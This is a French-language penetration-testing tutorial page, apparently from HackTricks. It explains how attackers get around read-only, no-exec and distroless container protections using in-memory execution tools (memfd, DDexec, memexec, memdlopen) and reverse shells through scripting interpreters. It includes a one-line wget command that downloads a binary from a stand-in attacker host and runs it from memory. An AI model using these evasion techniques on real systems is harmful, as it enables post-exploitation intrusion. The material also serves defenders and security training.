# Contournement des protections FS : read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Vidéos

Dans les vidéos suivantes, vous trouverez les techniques mentionnées sur cette page expliquées plus en détail :

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## Scénario read-only / no-exec

Il devient de plus en plus courant de trouver des machines linux montées avec une protection du système de fichiers en **read-only (ro)**, surtout dans les containers. C'est parce que lancer un container avec un système de fichiers ro est aussi simple que de définir **`readOnlyRootFilesystem: true`** dans le `securitycontext` :

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Cependant, même si le système de fichiers est monté en ro, **`/dev/shm`** restera écrivable, donc ce n'est pas vrai qu'on ne peut rien écrire sur le disque. En revanche, ce dossier sera **monté avec la protection no-exec**, donc si vous téléchargez un binaire ici vous **ne pourrez pas l'exécuter**.

> [!WARNING]
> Du point de vue red team, cela rend **plus compliqué de télécharger et d'exécuter** des binaires qui ne sont pas déjà présents sur le système (comme des backdoors ou des outils d'énumération comme `kubectl`).

## Easiest bypass: Scripts

Notez que j'ai parlé de binaires : vous pouvez **exécuter n'importe quel script** tant que l'interpréteur est présent sur la machine, par exemple un **shell script** si `sh` est présent ou un **python** **script** si `python` est installé.

Cependant, cela ne suffit pas pour exécuter votre backdoor binaire ou d'autres outils binaires dont vous pourriez avoir besoin.

## Memory Bypasses

Si vous voulez exécuter un binaire mais que le système de fichiers l'en empêche, la meilleure façon est de **l'exécuter depuis la mémoire**, car les **protections ne s'appliquent pas là**.

### FD + exec syscall bypass

Si vous disposez d'interpréteurs puissants sur la machine, tels que **Python**, **Perl**, ou **Ruby**, vous pouvez télécharger le binaire à exécuter depuis la mémoire, le stocker dans un file descriptor en mémoire (`create_memfd` syscall), qui ne sera pas soumis à ces protections, puis appeler un **`exec` syscall** en indiquant le **fd comme fichier à exécuter**.

Pour cela vous pouvez facilement utiliser le projet [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Vous pouvez lui passer un binaire et il générera un script dans le langage indiqué avec le **binaire compressé et b64 encoded** avec les instructions pour **decoder et decomprimer** dans un **fd** créé en appelant `create_memfd` syscall et un appel au **exec** syscall pour l'exécuter.

> [!WARNING]
> Cela ne fonctionne pas dans d'autres langages de script comme PHP ou Node car ils n'ont pas de manière **par défaut d'appeler des syscalls bruts** depuis un script, il n'est donc pas possible d'appeler `create_memfd` pour créer le **fd mémoire** pour stocker le binaire.
>
> De plus, créer un **fd régulier** avec un fichier dans `/dev/shm` ne fonctionnera pas, car vous ne serez pas autorisé à l'exécuter en raison de l'application de la **protection no-exec**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) est une technique qui vous permet de **modifier la mémoire de votre propre processus** en écrasant son **`/proc/self/mem`**.

Ainsi, en **contrôlant le code assembleur** exécuté par le processus, vous pouvez écrire un **shellcode** et « muter » le processus pour **exécuter n'importe quel code arbitraire**.

> [!TIP]
> **DDexec / EverythingExec** vous permettra de charger et **d'exécuter** votre propre **shellcode** ou **n'importe quel binaire** depuis la **mémoire**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Pour plus d'informations sur cette technique consultez le Github ou :

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.

Vous pouvez trouver un exemple montrant comment utiliser **memexec to execute binaries from a PHP reverse shell** dans [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.

## Distroless Bypass

Pour une explication dédiée de **ce qu'est réellement distroless**, quand cela aide, quand ce n'est pas le cas, et comment cela change les techniques post-exploitation dans les containers, consultez :

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Les conteneurs distroless contiennent uniquement les **composants strictement nécessaires pour exécuter une application ou un service spécifique**, comme les bibliothèques et dépendances d'exécution, mais excluent des composants plus volumineux tels qu'un gestionnaire de paquets, un shell ou des utilitaires système.

L'objectif des conteneurs distroless est de **réduire la surface d'attaque des containers en éliminant les composants inutiles** et de minimiser le nombre de vulnérabilités qui peuvent être exploitées.

### Reverse Shell

Dans un conteneur distroless vous pourriez **ne même pas trouver `sh` ou `bash`** pour obtenir un shell classique. Vous ne trouverez pas non plus de binaires tels que `ls`, `whoami`, `id`... tout ce que vous exécutez habituellement sur un système.

> [!WARNING]
> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.

Cependant, si le conteneur compromis exécute par exemple une application flask, python est alors installé, et vous pouvez donc récupérer un **Python reverse shell**. S'il exécute node, vous pouvez obtenir un Node rev shell, et de même avec à peu près n'importe quelle **scripting language**.

> [!TIP]
> Using the scripting language you could **enumerate the system** using the language capabilities.

S'il n'y a **pas de protections `read-only/no-exec`** vous pouvez abuser de votre reverse shell pour **écrire vos binaires dans le système de fichiers** et les **exécuter**.

> [!TIP]
> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.

Vous pouvez trouver **des exemples** montrant comment **exploit some RCE vulnerabilities** pour obtenir des scripting languages **reverse shells** et exécuter des binaires depuis la mémoire dans [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
